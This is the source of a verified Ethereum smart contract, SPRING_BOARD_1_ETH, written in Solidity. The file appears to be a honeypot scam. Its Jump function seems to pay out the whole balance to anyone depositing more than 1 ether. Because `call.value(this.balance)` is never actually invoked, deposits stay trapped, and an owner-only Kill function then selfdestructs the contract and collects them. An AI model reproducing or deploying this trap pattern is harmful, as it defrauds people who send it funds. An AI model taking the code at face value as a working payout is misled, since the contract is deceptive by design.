
//Address: 0x6805661283c64a79323d187f9d6b2ca4dae59fd0
//Contract name: SPRING_BOARD_1_ETH
//Balance: 1.000000127366232 Ether
//Verification Date: 3/20/2018
//Transacion Count: 2

// CODE STARTS HERE

pragma solidity ^0.4.19;

contract SPRING_BOARD_1_ETH   
{
    address owner = msg.sender;
    
    function() public payable {}
    
    function Jump()
    public
    payable
    {
        if(msg.value > 1 ether)
        {
            msg.sender.call.value(this.balance);
        }
    }
    
    function Kill()
    public
    payable
    {
        if(msg.sender==owner)
        {
            selfdestruct(owner);
        }
    }
}
